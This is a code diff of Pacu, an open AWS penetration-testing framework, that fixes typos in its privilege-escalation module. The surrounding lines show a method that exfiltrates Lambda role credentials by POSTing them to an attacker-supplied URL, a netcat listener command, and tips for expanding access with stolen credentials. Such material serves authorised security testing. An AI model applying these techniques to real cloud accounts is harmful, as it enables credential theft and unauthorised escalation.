@@ -301,7 +301,7 @@ def main(args, pacu_main):
         },
         'EditExistingLambdaFunctionWithRole': {
             'lambda:UpdateFunctionCode': True,  # Edit existing Lambda functions
-            'lambda:ListFunctions': True,  # Find existing lambda functions
+            'lambda:ListFunctions': True,  # Find existing Lambda functions
             'lambda:InvokeFunction': False  # Invoke it afterwards
         }
     }
@@ -1470,7 +1470,7 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
     with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
         code = f.read()
 
-    print('This privilege escalation method requires you to have some way of receiving HTTP requests and reading the contents of the body to retrieve the temporary credentials associated with the lambda function that will be created.\n')
+    print('This privilege escalation method requires you to have some way of receiving HTTP requests and reading the contents of the body to retrieve the temporary credentials associated with the Lambda function that will be created.\n')
     print('Start listening on your server now! Simple command to listen on an open port: "nc -nlvp <port>".\n')
     print('WARNING: This privilege escalation method will potentially call your function until it is deleted or the DynamoDB Streams are deleted. This can be useful in the sense that if the credentials you exfiltrated expire, you can get a new set, but it is possible for a large amount of requests to be made.\n')
     their_url = input('Please enter the URL where you would like the credentials POSTed to (example: http://127.0.0.1:8080): ')
@@ -1789,7 +1789,7 @@ def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
     try:
         # The capabilities parameter will take "CAPABILITY_NAMED_IAM"
         # as valid input even if only "CAPABILITY_IAM" is required
-        # and even if niether is required
+        # and even if neither is required
         if template[0] == 'url':
             response = client.create_stack(
                 StackName=stack_name,
@@ -1810,7 +1810,7 @@ def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
                     'CAPABILITY_NAMED_IAM'
                 ]
             )
-        print('Successfully started creation the CloudFormation stack {}! Here is the stack ID: {}\n'.format(stack_name, response['StackId']))
+        print('Successfully started creating the CloudFormation stack {}! Here is the stack ID: {}\n'.format(stack_name, response['StackId']))
         print('Now waiting for creation to finish to return you the results. Checking every 20 seconds...\n')
         waiter = client.get_waiter('stack_create_complete')
         waiter.wait(
@@ -1847,5 +1847,5 @@ def EditExistingLambdaFunctionWithRole(pacu_main, print, input, fetch_data):
     print('Completed enumeration of Lambda functions in all session regions.\n')
     print('It is suggested to access the functions through the AWS Web Console to determine how your code edits will affect the function. This module does not automatically modify functions due to the high risk of denial-of-service to the environment. Through the AWS API, you are required to first download the function code, modify it, then re-upload it, but through the web console, you can just edit it inline.\n')
     print('Tips: Use the AWS SDK for the language that the function is running to contact the AWS API using the credentials associated with the function to expand your access.\n')
-    print('You can now view the enumerated Lambda data but running the "data Lambda" command in Pacu.\n')
+    print('You can now view the enumerated Lambda data by running the "data Lambda" command in Pacu.\n')
     return True
